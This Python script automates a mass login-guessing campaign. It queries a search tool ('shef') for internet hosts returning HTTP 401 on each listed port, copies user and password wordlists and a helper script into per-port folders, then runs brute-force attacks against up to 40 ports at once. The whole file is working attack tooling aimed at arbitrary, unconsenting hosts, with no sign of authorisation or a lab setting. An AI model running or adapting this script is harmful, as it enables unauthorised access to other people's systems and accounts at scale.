import os
import shutil
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Configuration
ports_file = "ports.txt"
files_to_copy = ["passwd.txt", "script.sh", "users.txt"]
httpbrute_dir = "httpbrute"  # Directory containing files to copy
ports_dir = "ports"  # Base directory for port directories
delay_after = 3  # Number of commands to run before pausing
delay_seconds = 5  # Number of seconds to wait during pause
max_concurrent_ports = 40  # Number of concurrent brute force operations

# Ensure the base directory for ports exists
os.makedirs(ports_dir, exist_ok=True)

# Read the ports from ports.txt
try:
    with open(ports_file, "r") as file:
        ports = [line.strip() for line in file if line.strip()]
except FileNotFoundError:
    print(f"Error: {ports_file} not found.")
    exit(1)

def process_shef_with_delay(ports, delay_after, delay_seconds):
    """
    Process the shef commands sequentially with a delay after every `delay_after` commands.
    """
    for counter, port in enumerate(ports, start=1):
        port_dir = os.path.join(ports_dir, f"port_{port}")
        output_file = os.path.join(port_dir, f"{port}_401.txt")

        # Skip shef command if the output file already exists
        if os.path.exists(output_file):
            print(f"Skipping shef for port {port} as the file {output_file} already exists.")
        else:
            os.makedirs(port_dir, exist_ok=True)

            # Run the 'shef' command and save the output
            shef_command = f"shef -q \"country:test '401' port:{port}\" > {output_file}"
            print(f"Running shef for port {port}: {shef_command}")
            try:
                subprocess.run(shef_command, shell=True, check=True)
            except subprocess.CalledProcessError as e:
                print(f"Error running shef for port {port}: {e}")
                continue

            # Copy necessary files into the directory
            for file in files_to_copy:
                source_path = os.path.join(httpbrute_dir, file)
                destination_path = os.path.join(port_dir, file)
                if os.path.exists(source_path):
                    shutil.copy(source_path, destination_path)
                else:
                    print(f"Warning: {file} not found in {httpbrute_dir}.")

        # Introduce a delay after every `delay_after` commands
        if counter % delay_after == 0 and counter != len(ports):
            print(f"Pausing for {delay_seconds} seconds to prevent server overload...")
            time.sleep(delay_seconds)

def brute_force(port):
    """
    Execute the brute force script for a given port directory.
    """
    port_dir = os.path.join(ports_dir, f"port_{port}")
    script_path = os.path.join(port_dir, "script.sh")
    host_list_path = os.path.join(port_dir, f"{port}_401.txt")
    user_list_path = os.path.join(port_dir, "users.txt")
    pass_list_path = os.path.join(port_dir, "passwd.txt")

    brute_command = f"bash {script_path} {host_list_path} {user_list_path} {pass_list_path} {port}"
    print(f"Running brute force for port {port}: {brute_command}")
    try:
        subprocess.run(brute_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running brute force for port {port}: {e}")

# Step 1: Run 'shef' for all ports with delay
print("Starting shef processing for all ports...")
process_shef_with_delay(ports, delay_after, delay_seconds)
print("Shef processing completed for all ports.")

# Step 2: Start brute-forcing for ports in batches of max_concurrent_ports
print("Starting brute force attacks for all ports...")
for i in range(0, len(ports), max_concurrent_ports):
    batch_ports = ports[i:i + max_concurrent_ports]
    with ThreadPoolExecutor(max_workers=max_concurrent_ports) as executor:
        futures = [executor.submit(brute_force, port) for port in batch_ports]
        for future in as_completed(futures):
            future.result()  # Ensure each task completes

print("Brute force operations completed for all ports.")
